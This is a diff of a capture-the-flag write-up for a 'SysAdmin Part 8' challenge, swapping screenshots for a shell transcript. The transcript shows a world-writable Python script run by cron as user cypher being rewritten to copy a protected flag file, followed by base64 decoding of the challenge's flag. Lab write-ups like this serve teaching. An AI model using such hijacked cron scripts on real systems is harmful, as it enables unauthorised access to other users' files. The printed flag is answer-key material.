@@ -918,44 +918,44 @@ using ```vimdiff``` we can easly reveal  the flag..
 
 ## SysAdmin Part 8
 
-This challenge dealt with improper file permissions and cronjobs, and was a very fun little challenge :)
-Starting off, we need to find files that mention “cypher” in them. Doing a little find magic and we learn
-that /backup/ca584b15ae397a9ad45b1ff267b55796 contains some interesting cronjob
-information
+After doing some find magic we can find a backup directory with 4 readable archives
+<br>
+we can also see that the last archive contains a cronjob that will be executed every 3min
+<br>
+the job is a python script belongs to cypher user and have writeable permissions
+<br>
+so instead of writing ```ps aux``` output to a file in tmp we will read the flag file inside cypher home directory 
+- NOTE 
+``` if you don't know what is cronjobs is see this video : youtube.com/watch?v=7MFMnsnfBJs```
 
-![-000](https://user-images.githubusercontent.com/22657154/43790756-d0d08860-9a73-11e8-8496-eaeff4a69261.png)
+![sys_admin8_1](https://user-images.githubusercontent.com/22657154/43905200-db20061e-9bf0-11e8-9984-c917b703fba7.png)
 
-it seems that in var/spool/cron/crontabs/cypher some cronjob was made that runs /tmp/Gathering.py
-That's fishy enough, let's go ahead and check its permissions:
-
-![-001](https://user-images.githubusercontent.com/22657154/43790755-d0675232-9a73-11e8-82a7-5f6dc1564054.png)
-
-oooh happy day! It looks like it's been chmod 777'd! That means we can edit it, but it will still run as
-user cypher.
-Opening it up:
-
-![-002](https://user-images.githubusercontent.com/22657154/43790753-d03aca28-9a73-11e8-9cc3-ef6b2001d624.png)
-
-it seems to just backup the output of ps aux to a tmp file. Let's go ahead and instead have it cat out
-everything in cypher's home dir.To do this, let's first give it a file it can write to:
-
-![-003](https://user-images.githubusercontent.com/22657154/43790752-cfe88df8-9a73-11e8-8843-ddf292d961a9.png)
-
-and now we can update the python script
-
-![-004](https://user-images.githubusercontent.com/22657154/43790751-cfb60e32-9a73-11e8-95d0-b2f42b33ed34.png)
-
-and if we wait a bit we should see the output of cypher's home directory files in /tmp/towelwashere.txt
-Sure enough:
-
-![-005](https://user-images.githubusercontent.com/22657154/43790750-cf87b532-9a73-11e8-9c4f-e3d0c19873c9.png)
-
-So we can see that it's rewritting the Gathering.py file, and there's also a tasty looking base64 string.
+```assembly
+morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/Gathering.py
+import os
+os.system('ps aux > /tmp/28JNvE05KBltE8S7o2xu')
+morpheus@lxc-sysadmin:/home/cypher$ ls -lah /tmp/Gathering.py
+-rwxrwxrwx 1 cypher cypher 58 Aug  9 14:09 /tmp/Gathering.py
+morpheus@lxc-sysadmin:/home/cypher$ ls -lah
+total 32K
+drwxrwxrwx 2 cypher cypher 4.0K Aug  8 12:40 .
+drwxr-xr-x 8 root   root   4.0K May 30 18:08 ..
+lrwxrwxrwx 1 root   root      9 May 30 18:08 .bash_history -> /dev/null
+-rwxrwxrwx 1 cypher cypher  235 May 30 18:08 .bash_logout
+-rwxrwxrwx 1 cypher cypher 3.4K May 30 18:08 .bashrc
+-rw-rw-r-- 1 cypher cypher    0 Aug  5 01:21 flagdata
+-rw------- 1 cypher cypher   52 May 30 18:08 flag.txt
+-rwxrwxrwx 1 cypher cypher 5.3K Jun 23 11:46 info.txt
+-rwxrwxrwx 1 cypher cypher  675 May 30 18:08 .profile
+morpheus@lxc-sysadmin:/home/cypher$ cat flag.txt
+cat: flag.txt: Permission denied
+morpheus@lxc-sysadmin:/home/cypher$ nano /tmp/Gathering.py
+morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/Gathering.py
+import os
+os.system('cat /home/cypher/flag.txt > /tmp/flag.txt')
+morpheus@lxc-sysadmin:/home/cypher$ cat /tmp/flag.txt
+BASE ?
+RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
+morpheus@lxc-sysadmin:/home/cypher$ echo RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego= | base64 -d
+FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
 ```
-Base64 string:RkxBRy1weXMzZ2ZjenQ5cERrRXoyaW8wUHdkOEtOego=
-```
-```
-decoded goes to:FLAG-pys3gfczt9pDkEz2io0Pwd8KNz
-```
-There's that flag! Just goes to show you, check the file permissions of everything touched by your
-cronjob!
